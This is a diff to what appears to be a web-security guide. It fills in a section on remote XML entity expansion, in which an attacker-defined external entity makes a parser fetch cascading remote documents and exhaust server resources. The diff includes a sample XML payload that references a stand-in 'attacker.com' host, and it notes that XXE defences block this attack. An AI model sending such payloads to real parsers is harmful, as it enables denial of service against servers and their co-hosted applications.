@@ -216,7 +216,21 @@ The XML Bomb approach doesn't require a large XML size which might be restricted
 Remote Entity Expansion
 """""""""""""""""""""""
 
-TBD
+Both normal and recursive entity expansion attacks rely on locally defined entities in the XML's DTD but an attacker can also define the entities externally. This obviously requires that the XML parser is capable of making remote HTTP requests which, as we met earlier in describing XML External Entity Injection (XXE), should be disabled for your XML parser as a basic security measure. As a result, defending against XXEs defends against this form of XML Entity Expansion attack.
+ 
+Nevertheless, the way remote entity expansion works is by leading the XML parser into making remote HTTP requests to fetch the expanded value of the referenced entities. The results will then themselves define other external entities that the XML parser must additionally make HTTP requests for. In this way, a couple of innocent looking requests can rapidly spiral out of control adding strain to the server's available resources with the final result perhaps itself encompassing a recursive entity expansion just to make matters worse.
+ 
+.. code-block:: xml
+ 
+    <?xml version="1.0"?>
+    <!DOCTYPE results [
+        <!ENTITY cascade SYSTEM "http://attacker.com/entity1.xml">
+    ]>
+    <results>
+        <result>3..2..1...&cascade<result>
+    </results>
+ 
+The above also enables a more devious approach to executing a DOS attack should the remote requests be tailored to target the local application or any other application sharing its server resources. This can lead to a self-inflicted DOS attack where attempts to resolve external entities by the XML parser may trigger numerous requests to locally hosted applications thus consuming an even greater propostion of server resources. This method can therefore be used to amplify the impact of our earlier discussion about using XML External Entity Injection (XXE) attacks to perform a DOS attack.
 
 Defenses Against XML Entity Expansion
 ^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^
